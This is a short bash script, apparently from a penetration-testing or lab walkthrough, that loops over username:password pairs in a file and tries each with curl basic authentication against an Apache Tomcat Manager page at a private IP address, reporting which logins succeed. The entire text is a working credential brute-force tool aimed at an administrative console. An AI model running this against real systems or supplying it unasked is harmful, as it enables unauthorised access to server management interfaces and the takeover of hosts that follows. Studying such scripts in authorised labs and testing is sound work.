for CREDS in $(cat creds.txt); do
  echo $CREDS
  curl -s -u $CREDS http://192.168.42.100:8080/manager/html \
  | grep -q "Tomcat Web Application Manager" \
    && echo "VALID ACCESS" || echo "ACCESS FAILED"
done